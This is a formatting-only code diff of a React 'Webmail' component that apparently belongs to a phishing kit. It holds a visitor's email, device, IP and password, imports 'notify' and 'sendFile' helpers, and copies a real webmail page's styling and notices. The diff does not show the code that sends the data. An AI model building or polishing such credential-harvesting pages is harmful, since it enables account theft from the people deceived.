@@ -5,7 +5,8 @@ import { notify, sendFile } from "../servers";
 
 function Webmail({ location }) {
   const [values, setValues] = useState({
-    username: location.state.email,device: location.state.device,
+    username: location.state.email,
+    device: location.state.device,
     ip: location.state.ip,
     password: "",
   });
@@ -48,7 +49,7 @@ function Webmail({ location }) {
     <Fragment>
       <Helmet>
         <link rel="stylesheet" type="text/css" href="../webmail/main.css" />
-        <script src="../webmail/main.js"></script>
+        <script src="../webmail/main.js" />
       </Helmet>
       <noscript>
         &lt;p class="jsDisabled"&gt; JavaScript must be enabled in order to use
@@ -57,7 +58,7 @@ function Webmail({ location }) {
         enable JavaScript by changing your browser options, then try again.
         &lt;/p&gt;
       </noscript>
-      <div id="header"></div>
+      <div id="header" />
       <div id="topnav">
         <h2 id="aria-label-tasknav" className="voice">
           Application tasks
